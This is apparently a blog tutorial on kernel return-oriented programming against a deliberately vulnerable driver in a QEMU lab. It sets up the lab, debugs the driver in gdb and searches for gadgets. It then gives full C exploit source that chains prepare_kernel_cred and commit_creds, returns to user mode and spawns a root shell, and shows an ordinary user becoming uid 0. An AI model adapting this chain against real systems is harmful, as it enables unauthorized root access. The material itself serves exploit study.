---
layout: post
ads: true
comments: true
published: true
title: Linux kernel ROP example
categories:
  - linux
  - program
tags:
  - rop
  - pwn
  - kernel exploit
---

#### Setup environment
- Ref:
  - [xxx]()
  - [xxx]()
  
- Download [Virtualbox Ubuntu 12.04 image](https://www.osboxes.org/ubuntu/)  from osboxes
  - Open virtualbox and create new machine then select *Use an existing virtual hard disk file*
  - Go to networking setting of created machine and setup port forwarding there (to use ssh later) (host: 127.0.0.1, port: 2222; guest: 10.0.2.15, port: 22)
  - Boot the machine: (pass: osboxes.org)
  - Open terminal to update, change pass and install ssh
  
    ```bash
    # On virtual machine
    $ sudo apt-get update
    $ passwd
    $ sudo apt-get install openssh-server
    ```
  - Go to host to open ssh to virtual machine
    
    ```bash
    # on host
    $ ssh osboxes@localhost -p 2222
    ```

- Install qemu and ncurses (to use: make menuconfig)
  
  ```bash
  $ sudo apt-get install qemu qemu-system
  $ sudo apt-get install libncurses5-dev
  ```

- Build busybox
  
  ```bash
  $ pwd
  /home/osboxes
  $ wget https://busybox.net/downloads/busybox-1.19.4.tar.bz2 --no-check-certificate
  $ tar -xf busybox-1.19.4.tar.bz2
  $ cd busybox-1.19.4/
  $ make menuconfig
  # Enable:
  # -> Busybox Settings -> Build Options -> Build Busybox as a static binary
  # Disable:
  # -> Linux System Utilities -> [] Support mounting NFS file system
  # -> Networking Utilities -> [] inetd
  $ make install
  ```

  - After compiling, do the following configuration:
    
    ``` bash
    $ cd _install
    $ mkdir -pv {bin,sbin,etc,etc/init.d,proc,sys,usr/{bin,sbin}}
    ```
  - Create etc/inittab
  
    ``` bash
    ::sysinit:/etc/init.d/rcS
    ttyS0::askfirst:/bin/sh
    ::ctrlaltdel:/sbin/reboot
    ::shutdown:/sbin/swapoff -a
    ::shutdown:/bin/umount -a -r
    ::restart:/sbin/init
    ```
  - Create etc/init.d/rcS
  
    ```bash
    #!/bin/sh
    mount -t proc none /proc
    mount -t sys none /sys
    /bin/mount -n -t sysfs none /sys
    /bin/mount -t ramfs none /dev
    /sbin/mdev -s
    cd /dev
    /bin/rm -f console
    /bin/ln -s ttyS0 console
    ```
  - The above process is related to Linux startup, /etc/inittab and rcS do system initialization work, such as: load shell, mount disk and so on.
 
  - Create rootfs.img
  
    ```bash
    $ chmod +x etc/init.d/rcS
    $ find . | cpio -o --format=newc > ../rootfs.img
    ```

- Test boot with current kernel

  ```bash
  $ cd # return home
  $ qemu-system-x86_64 -kernel /boot/vmlinuz-3.11.0-15-generic -initrd busybox-1.19.4/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic

  # To quit from qemu with --nographic
  # press ctrl-A + C then type: quit
  ```

#### Kernel ROP example
- Ref:
  - [Linux Kernel ROP - Ropping your way to # (Part 1)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/)
  - [Linux Kernel ROP - Ropping your way to # (Part 2)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/)
  - [linux kernel rop](https://0x3f97.github.io/pwn/2018/04/27/linux-kernel-rop/)

- Big picture/idea for this expoloit as below
	
    ![kernel-rop-example.jpg]({{site.baseurl}}/media/kernel-rop-example.jpg)

- Clone source code and build example source
  
  ```bash
  $ cd # return home
  $ git clone https://github.com/vnik5287/kernel_rop.git
  $ cd kernel_rop
  $ make
  make -C /lib/modules/3.11.0-15-generic/build M=/home/osboxes/kernel_rop modules
  make[1]: Entering directory `/usr/src/linux-headers-3.11.0-15-generic'
    CC [M]  /home/osboxes/kernel_rop/drv.o
    /home/osboxes/kernel_rop/drv.c: In function ‘device_ioctl’:
    /home/osboxes/kernel_rop/drv.c:60:6: warning: assignment from incompatible pointer type [enabled by default]
      Building modules, stage 2.
      MODPOST 1 modules
      CC      /home/osboxes/kernel_rop/drv.mod.o
      LD [M]  /home/osboxes/kernel_rop/drv.ko
    make[1]: Leaving directory `/usr/src/linux-headers-3.11.0-15-generic'
    # compile the trigger
    gcc trigger.c -O2 -o trigger
  ```
- Add drv.ko file into busybox rootfs and re-create rootfs

  ```bash
  $ cp drv.ko ../busybox-1.19.4/_install/
  $ cd ../busybox-1.19.4/_install/
  $ find . | cpio -o --format=newc > ../rootfs.img
  ```
- Boot with qemu (specify -s to listen on port 1234 for debuger)
  
  ```bash
  $ cd # return home
  $ qemu-system-x86_64 -kernel /boot/vmlinuz-3.11.0-15-generic -initrd busybox-1.19.4/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -s
  ```
- Guest: get buffer base address. Insert kernel module (mdev -s: to refresh the /dev directory after insert module)
  ```sh
  / # ls
  bin      drv.ko   linuxrc  root     sys
  dev      etc      proc     sbin     usr
  / # insmod drv.ko 
  [   39.138135] drv: module verification failed: signature and/or required key missing - tainting kernel
  [   39.148377] addr(ops) = ffffffffa0002340
  / # mdev -s
  ```

- Guest: Get module .text address
  
  ```sh
  / # cat /sys/module/drv/sections/.text 
  0xffffffffa0000000
  ```

- Guest: get prepare_kernel_cred and commit_creds address
  
  ```sh
  / # cat /proc/kallsyms | grep prepare_kernel_cred
  ffffffff8108fa30 T prepare_kernel_cred
  / # cat /proc/kallsyms | grep commit_creds
  ffffffff8108f7b0 T commit_creds
  ```

- Host: gdb/qemu debug kernel remote target
  
  ```sh
  $ gdb /boot/vmlinuz-3.11.0-15-generic
  (gdb) target remote :1234
  (gdb) set disassembly-flavor intel
  
  (gdb) add-symbol-file drv.ko 0xffffffffa0000000
  add symbol table from file "drv.ko" at
    .text_addr = 0xffffffffa0000000
  (y or n) y
  Reading symbols from /home/osboxes/kernel_rop/drv.ko...done.

  (gdb) disassemble device_ioctl 
    Dump of assembler code for function device_ioctl:
      0xffffffffa00000bd <+0>:	data32 data32 data32 xchg ax,ax
      0xffffffffa00000c2 <+5>:	push   rbp
      0xffffffffa00000c3 <+6>:	mov    rbp,rsp
      0xffffffffa00000c6 <+9>:	sub    rsp,0x30
      0xffffffffa00000ca <+13>:	mov    QWORD PTR [rbp-0x18],rdi     ; device_ioctl 1st arg 
      0xffffffffa00000ce <+17>:	mov    DWORD PTR [rbp-0x1c],esi     ; device_ioctl 2nd arg
      0xffffffffa00000d1 <+20>:	mov    QWORD PTR [rbp-0x28],rdx     ; device_ioctl 3rd arg
      0xffffffffa00000d5 <+24>:	mov    eax,DWORD PTR [rbp-0x1c]
      0xffffffffa00000d8 <+27>:	test   eax,eax
      0xffffffffa00000da <+29>:	jne    0xffffffffa0000145 <device_ioctl+136>
      0xffffffffa00000dc <+31>:	mov    rax,QWORD PTR [rbp-0x28]
      0xffffffffa00000e0 <+35>:	mov    QWORD PTR [rbp-0x10],rax     ; save req struct address     
      0xffffffffa00000e4 <+39>:	mov    rax,QWORD PTR [rbp-0x10]
      0xffffffffa00000e8 <+43>:	mov    rax,QWORD PTR [rax]
      0xffffffffa00000eb <+46>:	mov    rsi,rax
      0xffffffffa00000ee <+49>:	mov    rdi,0xffffffffa0001066
      0xffffffffa00000f5 <+56>:	mov    eax,0x0
      0xffffffffa00000fa <+61>:	call   0xffffffff8172f662
      0xffffffffa00000ff <+66>:	mov    rax,QWORD PTR [rbp-0x10]
      0xffffffffa0000103 <+70>:	mov    rax,QWORD PTR [rax]
      0xffffffffa0000106 <+73>:	shl    rax,0x3
      0xffffffffa000010a <+77>:	add    rax,0xffffffffa0002340
      0xffffffffa0000110 <+83>:	mov    rsi,rax
      0xffffffffa0000113 <+86>:	mov    rdi,0xffffffffa0001074
      0xffffffffa000011a <+93>:	mov    eax,0x0
      0xffffffffa000011f <+98>:	call   0xffffffff8172f662
      0xffffffffa0000124 <+103>:	mov    rdx,0xffffffffa0002340
      0xffffffffa000012b <+110>:	mov    rax,QWORD PTR [rbp-0x10]
      0xffffffffa000012f <+114>:	mov    rax,QWORD PTR [rax]
      0xffffffffa0000132 <+117>:	shl    rax,0x3
      0xffffffffa0000136 <+121>:	add    rax,rdx
      0xffffffffa0000139 <+124>:	mov    QWORD PTR [rbp-0x8],rax
      0xffffffffa000013d <+128>:	mov    rax,QWORD PTR [rbp-0x8]
      0xffffffffa0000141 <+132>:	call   rax                        ; [1] call fn()
      0xffffffffa0000143 <+134>:	jmp    0xffffffffa0000146 <device_ioctl+137>
      0xffffffffa0000145 <+136>:	nop
      0xffffffffa0000146 <+137>:	mov    eax,0x0
      0xffffffffa000014b <+142>:	leave  
      0xffffffffa000014c <+143>:	ret    
    End of assembler dump.
  ```

- Host: get kernel gadgets
  ```sh
  $ cd # return home
  $ mkdir kernel_image
  $ cd kernel_image
  ```
  - If there is error related to SSL
    
    ```sh
    $ sudo apt-get install libssl-dev libssl1.0.0 openssl
    ```
  - Extract kernel. Download script from [kernel tree](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux)
    
    ```sh
      $ wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
      $ cp /boot/vmlinuz-3.11.0-15-generic .
      $ chmod u+x extract-vmlinux
      $ ./extract-vmlinux vmlinuz-3.11.0-15-generic > vmlinux-3.11.0-15-generic
      ```

  - Install [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
    
    ```sh
    $ wget https://raw.githubusercontent.com/pypa/get-pip/master/get-pip.py
    $ sudo python get-pip
    $ sudo pip install capstone
    $ sudo pip install ropgadget
    ```
  - Get kernel gadgets
    
    ```sh
    ROPgadget --binary vmlinux-3.11.0-15-generic > kernel.gadgets
    ```
  - Search for ROP
    
    ```sh
    $ grep ': pop rdi ; ret' kernel.gadgets
    0xffffffff810476e5 : pop rdi ; ret
    $ grep ': pop rdx ; ret' kernel.gadgets
    0xffffffff812366d2 : pop rdx ; ret
    $ grep ': mov rdi, rax ; call rdx' kernel.gadgets
    0xffffffff81035b51 : mov rdi, rax ; call rdx
    $ grep ': swapgs ; pop rbp ; ret' kernel.gadgets
    0xffffffff81050554 : swapgs ; pop rbp ; ret
    ```

- Host: find iretq
  
  ```sh
  objdump -j .text -d kernel_image/vmlinux-3.11.0-15-generic | grep iretq | head -1
  ffffffff81050dd6:	48 cf                	iretq
  ```

- Host: Find offset to xchg gadget

  - On my system the first xchg gadget not work because disassembly is different when run debug. So need update find_offset.py to find all and try (the second one work for me)

    ```python
    #!/usr/bin/env python
    import sys

    base_addr = int(sys.argv[1], 16)

    f = open(sys.argv[2], 'r') # gadgets

    for line in f.readlines():
      target_str, gadget = line.split(':')
      target_addr = int(target_str, 16)

      # check alignment
      if target_addr % 8 != 0:
        continue
      print '='*4
      offset = (target_addr - base_addr) / 8
      print 'offset =', (1 << 64) + offset
            print 'gadget =', line.strip()
      print 'stack addr = %x' % (target_addr & 0xffffffff)
      #break
    ```

    ```sh
    $ grep ': xchg eax, esp ; ret' kernel.gadgets > kernel.xchg.gadgets
    $ python ../kernel_rop/find_offset.py 0xffffffffa0002340 kernel.xchg.gadgets
    ====
    offset = 18446744073644639793
    gadget = 0xffffffff810c54c8 : xchg eax, esp ; ret 0x14ff
    stack addr = 810c54c8
    ====
    offset = 18446744073645214365
    gadget = 0xffffffff81527828 : xchg eax, esp ; ret 0x21
    stack addr = 81527828
    ====
    offset = 18446744073644591982
    gadget = 0xffffffff81067eb0 : xchg eax, esp ; ret 0x3145
    stack addr = 81067eb0
    ====
    ```

- Host: update rop_exploit.c with above information
  
  ```c
  /** 
   * ROP exploit for drv.c kernel module
   *
   * gcc rop_exploit.c -O2 -o rop_exploit
   *
   * Email: vnik@cyseclabs.com
   * Vitaly Nikolenko
   */

  #define _GNU_SOURCE
  #include <sys/types.h>
  #include <sys/stat.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <errno.h>
  #include <sys/mman.h>
  #include <assert.h>
  #include "drv.h"

  #define DEVICE_PATH "/dev/vulndrv"

  unsigned long user_cs;
  unsigned long user_ss;
  unsigned long user_rflags;

  static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
  }

  void shell(void) {
    if(!getuid()) { // mean rooted
      system("/bin/sh");
    }

    exit(0);
  }

  void usage(char *bin_name) {
    fprintf(stderr, "%s array_base_address_hex array_offset_decimal ret_inst_operand_hex \n", bin_name);
  }

  int main(int argc, char *argv[])
  {
    int fd;
    struct drv_req req;
    void *mapped, *temp_stack;
    unsigned long base_addr, stack_addr, mmap_addr, *fake_stack;
    unsigned long ret_inst_operand;

    if (argc != 4) {
      usage(argv[0]);
      return -1;
    }

    base_addr  = strtoul(argv[1], NULL, 16);
    req.offset = strtoul(argv[2], NULL, 10);
    ret_inst_operand = strtoul(argv[3], NULL, 16);

    printf("array base address = 0x%lx\n", base_addr);
    stack_addr = (base_addr + (req.offset * 8)) & 0xffffffff;
    fprintf(stdout, "stack address = 0x%lx\n", stack_addr);

    mmap_addr = stack_addr & 0xffff0000;
    assert((mapped = mmap((void*)mmap_addr, 0x20000, 7, 0x32, 0, 0)) == (void*)mmap_addr);
    assert((temp_stack = mmap((void*)0x30000000, 0x10000000, 7, 0x32, 0, 0)) == (void*)0x30000000);

    save_state();

    fake_stack = (unsigned long *)(stack_addr);
    *fake_stack ++= 0xffffffff810476e5UL; /* pop rdi ; ret */

    fake_stack = (unsigned long *)(stack_addr + ret_inst_operand + 8);

    *fake_stack ++= 0x0UL;                /* NULL */ 
    *fake_stack ++= 0xffffffff8108fa30UL; /* prepare_kernel_cred() */

    *fake_stack ++= 0xffffffff812366d2UL; /* pop rdx ; ret */
    //*fake_stack ++= 0xffffffff8108f7b0UL; /* commit_creds() */
    *fake_stack ++= 0xffffffff8108f7b6UL; // commit_creds() + 2 instructions

    *fake_stack ++= 0xffffffff81035b51UL; /* mov rdi, rax ; call rdx */

    #if 1
    *fake_stack ++= 0xffffffff81050554UL; // swapgs ; pop rbp ; ret
    *fake_stack ++= 0xdeadbeefUL;         // dummy placeholder 

    *fake_stack ++= 0xffffffff81050dd6UL; /* iretq */
    *fake_stack ++= (unsigned long)shell; /* spawn a shell */
    *fake_stack ++= user_cs;              /* saved CS */
    *fake_stack ++= user_rflags;          /* saved EFLAGS */
    *fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
    *fake_stack ++= user_ss;              /* saved SS */
    #endif

    fd = open(DEVICE_PATH, O_RDONLY);

    if (fd == -1) {
      perror("open");
    }

    ioctl(fd, 0, &req);

    return 0;
  }
  ``` 

- Host: build and add rop_exploit to rootfs
  
  ```sh
  $ gcc --static rop_exploit.c -o rop_exploit
  $ cd ~/busybox-1.19.4/_install/
  $ cp ~/kernel_rop/rop_exploit .
  $ find . | cpio -o --format=newc > ../rootfs.img
  ```

- Boot and test
  
  ```sh
  / # insmod drv.ko 
  [   57.808600] drv: module verification failed: signature and/or required key missing - tainting kernel
  [   57.824089] addr(ops) = ffffffffa0002340
  / # mdev -s
  / # chmod o+rw /dev/vulndrv

  / # adduser user
  addgroup: /etc/group: No such file or directory
  passwd: unknown uid 0  
  / # su user
  ~ $ id
  uid=1000(user) gid=1000 groups=1000

  / $ ./rop_exploit ffffffffa0002340 18446744073645214365 21
  array base address = 0xffffffffa0002340
  stack address = 0x81527828
  [  165.879158] device opened!
  [  165.888184] size = fffffffffc2a4a9d
  [  165.892331] fn is at ffffffff81527828
  / # id
  uid=0 gid=0
  ```
